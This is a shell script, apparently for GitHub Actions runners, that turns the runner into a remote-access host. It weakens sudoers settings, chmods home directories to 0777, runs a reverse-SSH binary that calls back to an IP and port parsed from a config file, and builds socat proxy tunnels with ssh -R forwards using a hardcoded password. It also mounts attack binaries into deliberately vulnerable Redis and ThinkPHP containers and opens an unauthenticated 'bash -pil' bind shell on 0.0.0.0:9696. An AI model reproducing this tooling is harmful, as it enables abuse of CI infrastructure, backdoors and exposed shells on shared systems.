# /home/runner/work/nc_test/nc_test/socat.bin -h
# proxy:<proxy-server>:<host>:<port>
#github cd/ci
#/home/runner/work/nc_test/nc_test/socat.bin -v  TCP4-LISTEN:50022,reuseaddr,fork  proxy:node4.buuoj.cn:127.0.0.1:2244,proxyport=29904 &


export HOME=/tmp;

#cat $GITHUB_WORKSPACE/docs/123.apk.00? >/tmp/t933.apk;
grep -q NPV /tmp/js9&&grep -q xrdp /tmp/js9&&
(
. $GITHUB_WORKSPACE/openv.sh
sudo bash -c 'mkdir -pv /run/user/1000;chmod 0777 /run/user/1000;
chmod 0777 /home/runneradmin;chmod 0777 /home/runneradmin/*;'
. $GITHUB_WORKSPACE/xrdp.sh
)&


grep -q NPV /tmp/js9||
(
grep -q xrdp /tmp/js9&&(
sudo bash -c 'mkdir -pv /run/user/1000;chmod 0777 /run/user/1000;
chmod 0777 /home/runneradmin;chmod 0777 /home/runneradmin/*;'
. $GITHUB_WORKSPACE/xrdp.sh
)&


grep -q xrdp /tmp/js9||
(
grep -q NPV /tmp/js9&&(. $GITHUB_WORKSPACE/openv.sh)
)&


mkdir -p -v  $GITHUB_WORKSPACE/package;
mkdir -p -v  $GITHUB_WORKSPACE/dist;

id>$GITHUB_WORKSPACE/package/d2023.txt;
#date>$GITHUB_WORKSPACE/dist/d2023.txt;
uptime>$GITHUB_WORKSPACE/d2023.txt;
cp /tmp/js9 $GITHUB_WORKSPACE/js9.txt;




grep -q AABBCC_rev_shell /tmp/js9 &&
(
((sudo $GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v  -l -p 20022)&)&

 sudo bash -c '  sed -i "s|Defaults\tenv_reset|Defaults \!env_reset|g"  /etc/sudoers;
                 grep -v "^#" /etc/sudoers | grep -v "^$"  2>&1 >  /tmp/js9a.txt '

    (while true; do
        [ ! -f /tmp/keepalive ] && break        
         num67z=$(date +%S);num76=$((${num67z}%8));
         bport=5005"$num76";echo $bport;

ip_port5=$(grep -oP "(?<=AABBCC_rev_shellLLL).*(?=FFF)" /tmp/js9)
port5=${ip_port5#*:};
ip5=${ip_port5%:*};

ip_port7=$(grep -oP "(?<=liumQ).*(?=liumZ)" /tmp/js9)
port7=${ip_port7#*:};
ip7=${ip_port7%:*};

if [ ! -z ${port7} ] && [ ! -z ${ip7} ]; then
 ((/home/runner/work/nc_test/nc_test/socat.bin TCP4-LISTEN:50022,reuseaddr,fork  proxy:${ip7}:127.0.0.1:2244,proxyport=${port7}  )&)&
  ((sleep 1;  
    (echo "ssh -o StrictHostKeyChecking=no -CNf -R 51194:127.0.0.1:1194   root@127.0.0.1 -p 50022";sleep 2;echo 123456;sleep 1;echo 123456;sleep 1;echo "ps aux|grep ssh";
     echo "ssh -o StrictHostKeyChecking=no -CNf -R 40022:127.0.0.1:20022  root@127.0.0.1 -p 50022";sleep 2;echo 123456;sleep 1;echo 123456;sleep 1;echo "ps aux|grep ssh";
     (  for((i=0;i<3;i++));do  echo -e "123456\n";sleep 2;done )  )|script /tmp/nz_revsshx64
    
    
    
(
(ps aux | grep  "51194:127.0.0.1:1194"|grep -v grep) && echo 51194_ok || (
   (echo "ssh  -o StrictHostKeyChecking=no   -CNf -R 51194:127.0.0.1:1194   root@127.0.0.1 -p 50022";sleep 2;echo 123456;sleep 1;echo 123456;sleep 1;
   (  for((i=0;i<9;i++));do  echo -e "\n";sleep 3;done )  )|script /tmp/nz_z51194
)
)&

(
(ps aux | grep "40022:127.0.0.1:20022"|grep -v grep) && echo 40022_ok || (
   (echo "ssh  -o StrictHostKeyChecking=no   -CNf -R 40022:127.0.0.1:20022   root@127.0.0.1 -p 50022";sleep 2;echo 123456;sleep 1;echo 123456;sleep 1;
   (  for((i=0;i<8;i++));do  echo -e "\n";sleep 3;done )  )|script /tmp/nz_z40022
)
)&

  )&)&
else
  if [ ! -z ${port5} ] && [ ! -z ${ip5} ]; then 
    #sudo chmod 0777 $GITHUB_WORKSPACE/natapp;
 #nohup sudo $GITHUB_WORKSPACE/natapp -authtoken=0c4f43f4aa226595 &
   #sudo sh -c "export HOME=/tmp;$GITHUB_WORKSPACE/upx_reverse-sshx64.bin  -v -b $bport  -p $port5 $ip5"; 


[ -f $GITHUB_WORKSPACE/upx_reverse-sshx64.bin ]&&sudo sh -c "$GITHUB_WORKSPACE/upx_reverse-sshx64.bin -v -b $bport -p $port5 $ip5";
   echo "exit_revSSH_isOK_$bport";
  fi
fi

echo "will sleep 61s for while true";
sleep 61; 
         
    done) &
) &


cat << EOF >/tmp/docker-compose.yaml 
version: "3.2"
services:
  redis:
    image: vulhub/redis:5.0.7
    container_name: vulhub_redis_5.0.7
    ports:
      - "127.3.3.3:16379:6379"
      - "0.0.0.0:19494:9494"
    volumes:
      - type: bind
        source: /home/runner/work/nc_test/nc_test/socat.bin
        target: /tmp/socat
        read_only: false
      - type: bind
        source: /home/runner/work/nc_test/nc_test/busybox.bin
        target: /busybox
        read_only: false
      - type: bind
        source: /home/runner/work/nc_test/nc_test/upx_reverse-sshx64.bin
        target: /tmp/upx_reverse-sshx64.bin
        read_only: false
      - type: bind
        source: /home/runner/work/nc_test/nc_test/agent.linux
        target: /tmp/agent.linux
        read_only: false
      - /home/runner/work/nc_test/nc_test:/pmt
EOF



cat << EOF >/tmp/docker-compose2.yaml 
version: "3.2"
services:
  thinkphp_6.0.12:
    image: vulhub/thinkphp:6.0.12
    container_name: thinkphp_6.0.12
    ports:
      - "0.0.0.0:20080:80"
      - "0.0.0.0:29494:9494"
    volumes:
      - type: bind
        source: /home/runner/work/nc_test/nc_test/socat.bin
        target: /tmp/socat
        read_only: false
      - type: bind
        source: /home/runner/work/nc_test/nc_test/busybox.bin
        target: /busybox
        read_only: false
      - type: bind
        source: /home/runner/work/nc_test/nc_test/upx_reverse-sshx64.bin
        target: /tmp/upx_reverse-sshx64.bin
        read_only: false
      - type: bind
        source: /home/runner/work/nc_test/nc_test/agent.linux
        target: /tmp/agent.linux
        read_only: false
        read_only: false
      - type: bind
        source: /home/runner/work/nc_test/nc_test/gossh
        target: /tmp/gossh
        read_only: false
      - /home/runner/work/nc_test/nc_test:/pmt
EOF


# (/usr/local/bin/docker-compose up -d )&
#/usr/local/bin/docker-compose -f /tmp/docker-compose.yaml  up  -d




[ -x /home/runner/work/nc_test/nc_test/socat.bin ]  &&busybox setsid /home/runner/work/nc_test/nc_test/socat.bin -v tcp-l:9696,bind=0.0.0.0,fork,reuseaddr exec:"bash -pil",pty,stderr,setsid,sigint,sane &
